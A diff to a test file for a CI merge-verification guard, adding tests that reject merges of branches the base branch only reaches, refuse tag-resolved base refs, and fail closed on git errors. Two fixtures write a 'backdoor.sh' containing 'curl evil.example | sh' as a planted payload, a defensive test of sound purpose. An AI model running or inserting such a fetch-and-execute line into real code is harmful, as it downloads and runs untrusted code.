@@ -22,9 +22,10 @@ import {
 // developer box `init.templateDir` plants a pre-commit hook into every new
 // repo, `core.hooksPath` applies a commit-message policy, and `core.excludesFile`
 // could make `git add` of a fixture file fail for a reason no reader would
-// guess. All three affect only WRITES, which only the fixture performs — the
-// predicate under test never writes — so the isolation belongs on the fixture's
-// own git calls.
+// guess. Those three affect writes, which only the fixture performs — but
+// `merge.*` and `diff.renames` also change how the PREDICATE recomputes a merge,
+// so both sides take the same env or the two halves of a test disagree for a
+// reason no reader would guess.
 //
 // It has to be passed explicitly rather than assigned to process.env: bun's
 // execFileSync does not propagate runtime process.env mutations to children, so
@@ -76,7 +77,7 @@ function witness(runHead: string, prHead: string, baseRef = BASE_REF) {
 
 beforeEach(() => {
   repo = mkdtempSync(join(tmpdir(), "witness-"));
-  git = makeGitRunner(repo);
+  git = makeGitRunner(repo, ISOLATED_GIT_ENV);
   run("init", "-q", "-b", "feature");
   run("config", "user.email", "t@example.test");
   run("config", "user.name", "Test");
@@ -343,7 +344,7 @@ describe("cleanIntegrateWitness — fails closed", () => {
         encoding: "utf8",
         env: ISOLATED_GIT_ENV,
       });
-      const result = cleanIntegrateWitness(makeGitRunner(shallow), {
+      const result = cleanIntegrateWitness(makeGitRunner(shallow, ISOLATED_GIT_ENV), {
         runHead,
         prHead,
         baseRef: BASE_REF,
@@ -372,7 +373,7 @@ describe("cleanIntegrateWitness — fails closed", () => {
     // The guard's answer is "is the run already in the base". An error there
     // must not read as "no" — that is the fail-open this shape is prone to.
     const { runHead, prHead } = buildCleanIntegrate();
-    const real = makeGitRunner(repo);
+    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
     const baseOid = run("rev-parse", BASE_REF);
     const failing: GitRunner = (args) => {
       if (args[0] === "merge-base" && args[2] === runHead && args[3] === baseOid) {
@@ -387,7 +388,7 @@ describe("cleanIntegrateWitness — fails closed", () => {
 
   it("when the parent list cannot be read", () => {
     const { runHead, prHead } = buildCleanIntegrate();
-    const real = makeGitRunner(repo);
+    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
     const failing: GitRunner = (args) =>
       args[0] === "rev-list"
         ? { ok: false, code: 128, stdout: "", stderr: "fatal: bad object" }
@@ -399,7 +400,7 @@ describe("cleanIntegrateWitness — fails closed", () => {
 
   it("when the head tree cannot be read", () => {
     const { runHead, prHead } = buildCleanIntegrate();
-    const real = makeGitRunner(repo);
+    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
     const failing: GitRunner = (args) =>
       args[0] === "rev-parse" && args[1]?.endsWith("^{tree}")
         ? { ok: false, code: 128, stdout: "", stderr: "fatal: bad object" }
@@ -414,7 +415,7 @@ describe("cleanIntegrateWitness — fails closed", () => {
     // Reporting either as "your merge conflicts" sends the author after a
     // problem they do not have.
     const { runHead, prHead } = buildCleanIntegrate();
-    const real = makeGitRunner(repo);
+    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
     const failing: GitRunner = (args) =>
       args[0] === "merge-tree"
         ? { ok: false, code: 129, stdout: "", stderr: "error: unknown option `write-tree'" }
@@ -463,6 +464,126 @@ describe("verify-claims.yml", () => {
   it("passes the PR's base ref to the verifier", () => {
     const validate = steps.find((s) => s.name === "Validate proof block");
     expect(validate!.env.PR_BASE_REF).toContain("pull_request.base.ref");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// The anchor is history, not reachability.
+//
+// A base branch built by merging pull requests REACHES every commit of every
+// merged branch, including work-in-progress states it was never at. Anchoring on
+// reachability therefore let an author integrate a previously-merged side branch
+// and have this report "proven" for content the base never carried. The anchor
+// asks a narrower question: was this parent ever a state of the base branch?
+// ---------------------------------------------------------------------------
+
+describe("cleanIntegrateWitness — the anchor is the base branch's own history", () => {
+  it("refuses a merge of a side branch the base only REACHES", () => {
+    const root = run("rev-parse", "HEAD");
+
+    // A side branch with a payload, merged into the base. The payload commit is
+    // reachable from the base for ever after, but the base was never at it: the
+    // merge dropped it again.
+    run("checkout", "-q", "-b", "old-pr", root);
+    const payload = commit("backdoor.sh", "curl evil.example | sh\n", "wip: debug hook");
+    run("rm", "-q", "backdoor.sh");
+    run("commit", "-q", "-m", "chore: drop the debug hook before review");
+
+    run("checkout", "-q", "-b", BASE_REF, root);
+    run("merge", "-q", "--no-ff", "-m", "Merge old-pr into base", "old-pr");
+
+    run("checkout", "-q", "feature");
+    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
+    // Not origin/main — the WIP commit the base merely reaches.
+    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", payload);
+    const prHead = run("rev-parse", "HEAD");
+
+    // The payload really is in the head, and really is reachable from the base.
+    expect(run("cat-file", "-e", `${prHead}:backdoor.sh`)).toBe("");
+    expect(
+      cleanIntegrateWitness(git, { runHead, prHead, baseRef: BASE_REF }).reason
+    ).toBe("base-not-on-base-branch");
+  });
+
+  it("still accepts integrating the tip of a base that itself contains merges", () => {
+    // The legitimate shape in every real repo: the base branch is built from
+    // merge commits, and the author integrates its tip.
+    const root = run("rev-parse", "HEAD");
+    run("checkout", "-q", "-b", "sibling", root);
+    commit("sibling.txt", "sibling\n", "feat: a landed sibling");
+    run("checkout", "-q", "-b", BASE_REF, root);
+    run("merge", "-q", "--no-ff", "-m", "Merge sibling into base", "sibling");
+
+    run("checkout", "-q", "feature");
+    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
+    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);
+
+    expect(
+      cleanIntegrateWitness(git, {
+        runHead,
+        prHead: run("rev-parse", "HEAD"),
+        baseRef: BASE_REF,
+      }).accepted
+    ).toBe(true);
+  });
+
+  it("still accepts integrating an older base state while the base moves on", () => {
+    // The author integrates today's tip; the base advances before landing. The
+    // parent is a PAST state of the base, which is exactly what the chain holds.
+    const root = run("rev-parse", "HEAD");
+    run("checkout", "-q", "-b", BASE_REF, root);
+    commit("one.txt", "1\n", "chore: base state one");
+
+    run("checkout", "-q", "feature");
+    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
+    run("merge", "-q", "--no-ff", "-m", "Merge base into feature", BASE_REF);
+    const prHead = run("rev-parse", "HEAD");
+
+    run("checkout", "-q", BASE_REF);
+    commit("two.txt", "2\n", "chore: base state two");
+
+    expect(
+      cleanIntegrateWitness(git, { runHead, prHead, baseRef: BASE_REF }).accepted
+    ).toBe(true);
+  });
+
+  it("refuses when the base ref resolves only as a tag", () => {
+    // rev-parse resolves a bare name through refs/tags first, so a tag sharing
+    // the base branch's name used to point the anchor wherever the tag pointed.
+    // A pull request base is never a tag.
+    const root = run("rev-parse", "HEAD");
+    run("checkout", "-q", "-b", "evil", root);
+    commit("backdoor.sh", "curl evil.example | sh\n", "feat: never reviewed");
+    run("tag", "release", "evil");
+
+    run("checkout", "-q", "feature");
+    const runHead = commit("feature.txt", "feature\n", "feat: the work CI ran on");
+    run("merge", "-q", "--no-ff", "-m", "Merge evil into feature", "evil");
+
+    const result = cleanIntegrateWitness(git, {
+      runHead,
+      prHead: run("rev-parse", "HEAD"),
+      baseRef: "release",
+    });
+    expect(result.accepted).toBe(false);
+    expect(result.reason).toBe("unresolvable");
+  });
+
+  it("fails closed when the base branch's chain cannot be read", () => {
+    const { runHead, prHead } = buildCleanIntegrate();
+    const real = makeGitRunner(repo, ISOLATED_GIT_ENV);
+    const failing: GitRunner = (args) =>
+      args[0] === "rev-list" && args.includes("--first-parent")
+        ? { ok: false, code: 128, stdout: "", stderr: "fatal: bad revision" }
+        : real(args);
+    const result = cleanIntegrateWitness(failing, {
+      runHead,
+      prHead,
+      baseRef: BASE_REF,
+    });
+    expect(result.reason).toBe("unresolvable");
+    // The message must not assert what git declined to determine.
+    expect(result.detail).toContain("cannot read the first-parent chain");
   });
 });
 
